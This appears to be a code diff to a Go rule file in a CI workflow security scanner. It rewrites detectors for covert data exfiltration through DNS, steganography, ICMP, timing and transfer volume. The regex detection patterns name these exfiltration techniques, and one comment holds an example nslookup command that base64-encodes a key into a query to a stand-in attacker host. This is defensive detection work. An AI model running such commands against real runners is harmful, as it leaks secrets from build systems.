@@ -18,300 +18,114 @@ package rules
 
 import (
 	"regexp"
-	"strings"
 
 	"github.com/harekrishnarai/flowlyt/v2/pkg/parser"
 )
 
-// AdvancedExfiltrationDetector detects advanced data exfiltration techniques
-// Addresses Issue #16: Exfiltration Scanner Misses DNS, Tunneling & Encoded Data Patterns
-type AdvancedExfiltrationDetector struct {
-	// DNS exfiltration patterns
-	dnsPatterns []*regexp.Regexp
+// Advanced exfiltration detection.
+//
+// These techniques deliberately complement, rather than duplicate,
+// MALICIOUS_DATA_EXFILTRATION. That rule already covers the common cases:
+// named tunnelling services, known paste/webhook endpoints, direct IP targets,
+// and secrets piped into curl. The techniques here cover channels it cannot
+// see, where the data leaves over a protocol or medium that is not obviously a
+// network upload.
+//
+// Each technique is deliberately narrow. A broad pattern in this space produces
+// findings on ordinary build scripts, and an exfiltration rule that cries wolf
+// is worse than no rule at all.
 
-	// Tunneling tool patterns
-	tunnelPatterns []*regexp.Regexp
+var (
+	// A DNS lookup whose hostname is built by command substitution. Data is
+	// smuggled out in the query name itself, so nothing is ever "uploaded".
+	// MALICIOUS_DATA_EXFILTRATION only matches simple `$VAR` interpolation
+	// here, so `nslookup "$(cat key | base64).evil.example"` slips past it.
+	dnsLookupWithSubstitution = regexp.MustCompile(`(?i)\b(nslookup|dig|host|drill)\b[^|;]*\$\(`)
 
-	// Encoding/obfuscation patterns
-	encodingPatterns []*regexp.Regexp
+	// A workflow expression or command substitution used as a subdomain label,
+	// which is the canonical DNS exfiltration shape.
+	dnsSubdomainExfil = regexp.MustCompile(`(?i)(\$\{\{[^}]+\}\}|\$\([^)]*\))\.[a-z0-9][a-z0-9-]*\.[a-z]{2,}`)
 
-	// Steganography patterns
-	stegoPatterns []*regexp.Regexp
+	// DNS-over-HTTPS resolvers used to carry an expression, which evades
+	// egress filtering that only watches port 53.
+	dnsOverHTTPSExfil = regexp.MustCompile(`(?i)curl[^|;]*(dns\.google|cloudflare-dns\.com|dns\.quad9\.net|\b1\.1\.1\.1\b)[^|;]*\$\{\{`)
+)
 
-	// Covert channel patterns
-	covertPatterns []*regexp.Regexp
-}
+var (
+	// Tools whose entire purpose is hiding one file inside another.
+	steganographyEmbed = regexp.MustCompile(`(?i)\b(steghide\s+embed|outguess\s+-d|stegosuite|zsteg\s+-|cloakify)\b`)
 
-// NewAdvancedExfiltrationDetector creates a new advanced exfiltration detector
-func NewAdvancedExfiltrationDetector() *AdvancedExfiltrationDetector {
-	return &AdvancedExfiltrationDetector{
-		dnsPatterns: []*regexp.Regexp{
-			// DNS exfiltration via subdomain
-			regexp.MustCompile(`\$\{\{[^}]+\}\}\.[a-z0-9-]+\.(com|net|org|io|xyz|tk)`),
-			// nslookup/dig with variable
-			regexp.MustCompile(`(nslookup|dig|host).*\$\{\{[^}]+\}\}`),
-			// DNS over HTTPS exfiltration
-			regexp.MustCompile(`curl.*https://(dns\.google|cloudflare-dns\.com|[18]\.1\.1\.1).*\$\{\{`),
+	// Metadata fields large enough to carry a secret, written with a value
+	// derived from an expression or a secret.
+	steganographyMetadata = regexp.MustCompile(`(?i)exiftool[^|;]*-(comment|usercomment|description|xmp:[a-z]+)\s*=[^|;]*(\$\{\{|\$\()`)
+)
+
+var (
+	// ICMP with an explicit hex payload. Legitimate CI never needs this.
+	icmpPayloadChannel = regexp.MustCompile(`(?i)\bping\b[^|;]*\s-p\s+[0-9a-f]{4,}`)
+
+	// Sleep duration derived from untrusted input: a timing side channel that
+	// leaks data through job duration.
+	timingChannel = regexp.MustCompile(`(?i)\bsleep\s+\$\(\([^)]*\$\{\{`)
+
+	// Transfer size derived from untrusted input, leaking data through the
+	// volume written rather than its content.
+	volumeChannel = regexp.MustCompile(`(?i)\bdd\b[^|;]*\bcount=\$?\{?\{?[^\s]*\$\{\{`)
+)
+
+// exfiltrationTechniques enumerates the covert exfiltration channels detected.
+//
+// To cover a new technique, add an entry here: the shared scanner supplies line
+// pinpointing, comment handling, and deduplication.
+func exfiltrationTechniques() []shellTechnique {
+	return []shellTechnique{
+		{
+			ID:          "DNS_EXFILTRATION",
+			Name:        "Data Exfiltration via DNS",
+			Severity:    High,
+			Category:    MaliciousPattern,
+			Description: "Command encodes data into a DNS query, exfiltrating it over a channel that egress filtering and network monitoring rarely inspect",
+			Remediation: "Remove the lookup. If the workflow genuinely needs dynamic DNS resolution, build the hostname from a fixed allowlist rather than from command output or workflow expressions.",
+			MatchLine:   anyPattern(dnsLookupWithSubstitution, dnsSubdomainExfil, dnsOverHTTPSExfil),
 		},
-		tunnelPatterns: []*regexp.Regexp{
-			// ngrok
-			regexp.MustCompile(`(ngrok|./ngrok)\s+(http|tcp|start)`),
-			// cloudflared (Cloudflare Tunnel)
-			regexp.MustCompile(`cloudflared\s+tunnel`),
-			// localtunnel
-			regexp.MustCompile(`(lt|localtunnel)\s+--port`),
-			// serveo
-			regexp.MustCompile(`ssh.*serveo\.net`),
-			// pagekite
-			regexp.MustCompile(`pagekite\.py`),
-			// bore
-			regexp.MustCompile(`bore\s+(local|server)`),
+		{
+			ID:          "STEGANOGRAPHIC_EXFILTRATION",
+			Name:        "Data Exfiltration via Steganography",
+			Severity:    Medium,
+			Category:    MaliciousPattern,
+			Description: "Command hides data inside another file or its metadata, so the payload survives artifact upload and review without appearing to be sensitive",
+			Remediation: "Remove the embedding step. Data that must leave the runner should travel over an audited channel where its contents are visible to reviewers.",
+			MatchLine:   anyPattern(steganographyEmbed, steganographyMetadata),
 		},
-		encodingPatterns: []*regexp.Regexp{
-			// Base64 encode with curl/wget
-			regexp.MustCompile(`\$\{\{[^}]+\}\}.*\|\s*base64\s*\|\s*(curl|wget)`),
-			// Hex encode
-			regexp.MustCompile(`\$\{\{[^}]+\}\}.*\|\s*(xxd|hexdump).*\|\s*(curl|wget)`),
-			// Gzip + Base64
-			regexp.MustCompile(`\$\{\{[^}]+\}\}.*\|\s*gzip\s*\|\s*base64\s*\|\s*(curl|wget)`),
-			// URL encode
-			regexp.MustCompile(`\$\{\{[^}]+\}\}.*\|\s*jq\s+-sRr\s+@uri\s*\|\s*(curl|wget)`),
-		},
-		stegoPatterns: []*regexp.Regexp{
-			// steghide
-			regexp.MustCompile(`steghide\s+embed`),
-			// exiftool with data
-			regexp.MustCompile(`exiftool.*-Comment=.*\$\{\{`),
-			// Data hidden in images
-			regexp.MustCompile(`(convert|magick).*\$\{\{[^}]+\}\}`),
-		},
-		covertPatterns: []*regexp.Regexp{
-			// ICMP exfiltration
-			regexp.MustCompile(`ping.*-p\s+[0-9a-fA-F]+`),
-			// Timing-based covert channel
-			regexp.MustCompile(`sleep\s+\$\(\(.*\$\{\{[^}]+\}\}`),
-			// File size covert channel
-			regexp.MustCompile(`dd.*count=\$\{\{[^}]+\}\}`),
+		{
+			ID:          "COVERT_CHANNEL_EXFILTRATION",
+			Name:        "Data Exfiltration via Covert Channel",
+			Severity:    Medium,
+			Category:    MaliciousPattern,
+			Description: "Command leaks data through a side channel such as ICMP payloads, job timing, or transfer volume, rather than through an observable upload",
+			Remediation: "Remove the command. Encoding data into packet payloads, sleep durations, or transfer sizes has no legitimate purpose in CI.",
+			MatchLine:   anyPattern(icmpPayloadChannel, timingChannel, volumeChannel),
 		},
 	}
 }
 
-// DetectAdvancedExfiltration scans for advanced exfiltration techniques
-func (d *AdvancedExfiltrationDetector) DetectAdvancedExfiltration(workflow *parser.Workflow) []Finding {
-	findings := []Finding{}
-
-	// 1. DNS exfiltration
-	findings = append(findings, d.detectDNSExfiltration(workflow)...)
-
-	// 2. Tunneling tools
-	findings = append(findings, d.detectTunneling(workflow)...)
-
-	// 3. Encoded exfiltration
-	findings = append(findings, d.detectEncodedExfiltration(workflow)...)
-
-	// 4. Steganography
-	findings = append(findings, d.detectSteganography(workflow)...)
-
-	// 5. Covert channels
-	findings = append(findings, d.detectCovertChannels(workflow)...)
-
-	return findings
+// CheckAdvancedExfiltration detects covert data exfiltration channels in
+// `run:` steps.
+func CheckAdvancedExfiltration(workflow parser.WorkflowFile) []Finding {
+	return scanShellTechniques(workflow, exfiltrationTechniques())
 }
 
-// detectDNSExfiltration finds DNS-based exfiltration
-func (d *AdvancedExfiltrationDetector) detectDNSExfiltration(workflow *parser.Workflow) []Finding {
-	findings := []Finding{}
-
-	for jobName, job := range workflow.Jobs {
-		for _, step := range job.Steps {
-			if step.Run == "" {
-				continue
-			}
-
-			// Check DNS patterns
-			for _, pattern := range d.dnsPatterns {
-				if pattern.MatchString(step.Run) {
-					findings = append(findings, Finding{
-						RuleID:      "DNS_EXFILTRATION",
-						RuleName:        "Data Exfiltration via DNS",
-						Severity:    "CRITICAL",
-						Category:    "injection",
-						Description:     "Detected potential DNS-based data exfiltration",
-						Remediation: "Never include secrets or sensitive data in DNS queries. Use secure, monitored channels for data transfer.",
-						FilePath:        workflow.Name,
-						LineNumber:        0,
-						JobName:     jobName,
-						StepName:    step.Name,
-						Evidence:     truncateContext(step.Run, 200),
-					})
-				}
-			}
-		}
-	}
-
-	return findings
+// Each technique is also exposed as an individually registrable rule so users
+// can enable or disable it by ID. Selection is by ID rather than by slice
+// position, so reordering the table cannot silently repoint a rule.
+func checkDNSExfiltration(workflow parser.WorkflowFile) []Finding {
+	return scanShellTechniques(workflow, selectTechniques(exfiltrationTechniques(), "DNS_EXFILTRATION"))
 }
 
-// detectTunneling finds tunneling tool usage
-func (d *AdvancedExfiltrationDetector) detectTunneling(workflow *parser.Workflow) []Finding {
-	findings := []Finding{}
-
-	for jobName, job := range workflow.Jobs {
-		for _, step := range job.Steps {
-			if step.Run == "" {
-				continue
-			}
-
-			// Check for tunneling tools
-			for _, pattern := range d.tunnelPatterns {
-				if matches := pattern.FindString(step.Run); matches != "" {
-					toolName := extractTunnelTool(matches)
-
-					findings = append(findings, Finding{
-						RuleID:      "TUNNELING_EXFILTRATION",
-						RuleName:        "Data Exfiltration via Tunneling",
-						Severity:    "CRITICAL",
-						Category:    "injection",
-						Description:     "Detected use of tunneling tool: " + toolName,
-						Remediation: "Avoid using tunneling tools in CI/CD. If needed, use approved tools with proper monitoring and access controls.",
-						FilePath:        workflow.Name,
-						LineNumber:        0,
-						JobName:     jobName,
-						StepName:    step.Name,
-						Evidence:     truncateContext(step.Run, 200),
-					})
-				}
-			}
-		}
-	}
-
-	return findings
+func checkSteganographicExfiltration(workflow parser.WorkflowFile) []Finding {
+	return scanShellTechniques(workflow, selectTechniques(exfiltrationTechniques(), "STEGANOGRAPHIC_EXFILTRATION"))
 }
 
-// detectEncodedExfiltration finds encoded data exfiltration
-func (d *AdvancedExfiltrationDetector) detectEncodedExfiltration(workflow *parser.Workflow) []Finding {
-	findings := []Finding{}
-
-	for jobName, job := range workflow.Jobs {
-		for _, step := range job.Steps {
-			if step.Run == "" {
-				continue
-			}
-
-			// Check encoding patterns
-			for _, pattern := range d.encodingPatterns {
-				if pattern.MatchString(step.Run) {
-					findings = append(findings, Finding{
-						RuleID:      "ENCODED_EXFILTRATION",
-						RuleName:        "Data Exfiltration with Encoding",
-						Severity:    "HIGH",
-						Category:    "injection",
-						Description:     "Detected encoded data exfiltration attempt",
-						Remediation: "Monitor and restrict encoding of sensitive data. Ensure all data transfers are through approved, secure channels.",
-						FilePath:        workflow.Name,
-						LineNumber:        0,
-						JobName:     jobName,
-						StepName:    step.Name,
-						Evidence:     truncateContext(step.Run, 200),
-					})
-				}
-			}
-		}
-	}
-
-	return findings
-}
-
-// detectSteganography finds steganographic exfiltration
-func (d *AdvancedExfiltrationDetector) detectSteganography(workflow *parser.Workflow) []Finding {
-	findings := []Finding{}
-
-	for jobName, job := range workflow.Jobs {
-		for _, step := range job.Steps {
-			if step.Run == "" {
-				continue
-			}
-
-			// Check steganography patterns
-			for _, pattern := range d.stegoPatterns {
-				if pattern.MatchString(step.Run) {
-					findings = append(findings, Finding{
-						RuleID:      "STEGANOGRAPHIC_EXFILTRATION",
-						RuleName:        "Data Exfiltration via Steganography",
-						Severity:    "HIGH",
-						Category:    "injection",
-						Description:     "Detected steganographic data hiding technique",
-						Remediation: "Restrict use of steganography tools. Monitor file uploads and artifact generation.",
-						FilePath:        workflow.Name,
-						LineNumber:        0,
-						JobName:     jobName,
-						StepName:    step.Name,
-						Evidence:     truncateContext(step.Run, 200),
-					})
-				}
-			}
-		}
-	}
-
-	return findings
-}
-
-// detectCovertChannels finds covert channel exfiltration
-func (d *AdvancedExfiltrationDetector) detectCovertChannels(workflow *parser.Workflow) []Finding {
-	findings := []Finding{}
-
-	for jobName, job := range workflow.Jobs {
-		for _, step := range job.Steps {
-			if step.Run == "" {
-				continue
-			}
-
-			// Check covert channel patterns
-			for _, pattern := range d.covertPatterns {
-				if pattern.MatchString(step.Run) {
-					findings = append(findings, Finding{
-						RuleID:      "COVERT_CHANNEL_EXFILTRATION",
-						RuleName:        "Data Exfiltration via Covert Channel",
-						Severity:    "MEDIUM",
-						Category:    "injection",
-						Description:     "Detected potential covert channel usage",
-						Remediation: "Monitor unusual patterns in network timing, file operations, and ICMP traffic.",
-						FilePath:        workflow.Name,
-						LineNumber:        0,
-						JobName:     jobName,
-						StepName:    step.Name,
-						Evidence:     truncateContext(step.Run, 200),
-					})
-				}
-			}
-		}
-	}
-
-	return findings
-}
-
-// Helper functions
-
-func truncateContext(s string, maxLen int) string {
-	if len(s) <= maxLen {
-		return s
-	}
-	return s[:maxLen] + "..."
-}
-
-func extractTunnelTool(match string) string {
-	if strings.Contains(match, "ngrok") {
-		return "ngrok"
-	} else if strings.Contains(match, "cloudflared") {
-		return "cloudflared"
-	} else if strings.Contains(match, "localtunnel") || strings.Contains(match, "lt ") {
-		return "localtunnel"
-	} else if strings.Contains(match, "serveo") {
-		return "serveo.net"
-	} else if strings.Contains(match, "pagekite") {
-		return "pagekite"
-	} else if strings.Contains(match, "bore") {
-		return "bore"
-	}
-	return "unknown"
+func checkCovertChannelExfiltration(workflow parser.WorkflowFile) []Finding {
+	return scanShellTechniques(workflow, selectTechniques(exfiltrationTechniques(), "COVERT_CHANNEL_EXFILTRATION"))
 }
